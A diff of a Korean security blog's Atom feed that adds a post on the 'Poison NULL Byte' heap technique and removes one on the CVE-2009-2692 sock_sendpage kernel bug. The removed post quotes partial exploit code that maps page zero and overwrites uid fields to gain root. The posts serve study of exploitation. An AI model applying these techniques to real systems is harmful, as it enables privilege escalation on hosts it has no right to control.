@@ -4,7 +4,7 @@
   <title><![CDATA[KC's blog]]></title>
   <link href="http://zomo.heroku.com/atom.xml" rel="self"/>
   <link href="http://zomo.heroku.com/"/>
-  <updated>2016-06-13T14:15:14+09:00</updated>
+  <updated>2016-06-13T17:17:53+09:00</updated>
   <id>http://zomo.heroku.com/</id>
   <author>
     <name><![CDATA[KC]]></name>
@@ -12,6 +12,29 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Poison NULL Byte]]></title>
+    <link href="http://zomo.heroku.com/blog/2016/06/13/poison-null-byte/"/>
+    <updated>2016-06-13T16:46:53+09:00</updated>
+    <id>http://zomo.heroku.com/blog/2016/06/13/poison-null-byte</id>
+    <content type="html"><![CDATA[<p><a href="https://github.com/shellphish/how2heap/blob/master/poison_null_byte.c">Shellphish 가 쓴 힙 공격 문서중에 하나, Poison NULL byte</a> 를 읽고 정리한다.</p>
+
+<p>우선 a,b,c 를 차례로 alloc 한다.</p>
+
+<p>Ubuntu 에서 0x100 을 을 alloc 하고, <code>malloc_usable_size()</code> 를 해보면, 0x108 이 나온다. Rounding 때문인지, 요청한 것보다 메모리 영역이 더 잡혔다.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>a = (uint8_t*)malloc(0x100);
+</span><span class='line'>b = (uint8_t*)malloc(0x200);
+</span><span class='line'>c = (uint8_t*)malloc(0x100);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>이제 <code>uint64_t* b_size_ptr = (uint64_t*)(b-8);</code> 을 통해서, <code>struct malloc_chunk</code> 구조체 의 <code>INTERNAL_SIZE_T size;</code> 를 가리키는 포인터를 만든다.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Control-flow Enforcement Technology Preview]]></title>
@@ -1007,71 +1030,6 @@ OpenSSL 버그때문에, 서버 설정에 상관없이, 강제로 SSLv2 로 네�
     <updated>2016-01-11T15:39:41+09:00</updated>
     <id>http://zomo.heroku.com/blog/2016/01/11/bsides-vienna-2015-writing-your-first-windows-exploit-in-less-than-one-hour</id>
     <content type="html"><![CDATA[<p>BSides Vienna 2015 에 발표된 <a href="https://github.com/maldevel/BSides_Vienna_2015/blob/master/exploit_workshop.pdf">Writing your first windows exploit in less than one hour</a> 를 정리해본다.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Sock_sendpage]]></title>
-    <link href="http://zomo.heroku.com/blog/2016/01/11/sock-sendpage/"/>
-    <updated>2016-01-11T14:42:27+09:00</updated>
-    <id>http://zomo.heroku.com/blog/2016/01/11/sock-sendpage</id>
-    <content type="html"><![CDATA[<p>CVE-2009-2692, sock_sendpage 에서 벌어지는 NULL pointer deref 버그를 정리한다. 발견자가 Tarvis Ormandy 인지 Brad Spengler 인지는 이런저런 문서를 읽어봐도 잘 모르겠다.</p>
-
-<p>Exploit 자체는 꽤 클래식해서 정리해놓을 가치가 있다고 생각한다.</p>
-
-<p><a href="http://http://downloads.securityfocus.com/vulnerabilities/exploits/36038-5.c">exploit.c</a></p>
-
-<h4>Exploit</h4>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>...
-</span><span class='line'>if ((zero_page = mmap(0x00000000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,0,0)) == MAP_FAILED) {
-</span><span class='line'>  ...
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<p>0x0 에 4096 bytes 짜리 메모리 페이지를 할당한다.</p>
-
-<p>그리고, payload 를 담고있는 변수의 주소를 0x00000002,0x3,0x4,0x5 에 깐다.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>*(char *)0x00000000 = 0xff;
-</span><span class='line'>*(char *)0x00000001 = 0x25;
-</span><span class='line'>*(unsigned long *)0x00000002 = (unsigned long)&kernel;
-</span><span class='line'>*(char *)0x00000006 = 0xc3;</span></code></pre></td></tr></table></div></figure>
-
-
-<p>버그가 trigger 되면 <code>fp = *(unsigned long)(*(unsigned long)((0x00000000)-&gt;0x2)); (*fp)();</code> 하는 모양.</p>
-
-<p>Kernel priv. 로 돌아가는 페이로드는 다음과 같다. cred structure 에서 uid 들을 고치는 페이로드.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>while (pcb_task_struct) {
-</span><span class='line'>  if (pcb_task_struct[0] == uid && pcb_task_struct[1] == uid &&
-</span><span class='line'>      pcb_task_struct[2] == uid & pcb_task_struct[3] == uid &&
-</span><span class='line'>      ...) {
-</span><span class='line'>      pcb_task_struct[0] = [1] = ... = [7] = 0;
-</span><span class='line'>      break;
-</span><span class='line'>  }   
-</span><span class='line'>  pcb_task_struct++;
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<p>그런데 왜 NULL porinter 를 deref 하게 되는지는 너무 오래된 버그라서 큰 의미는 없을 것 같다.</p>
 ]]></content>
   </entry>
   
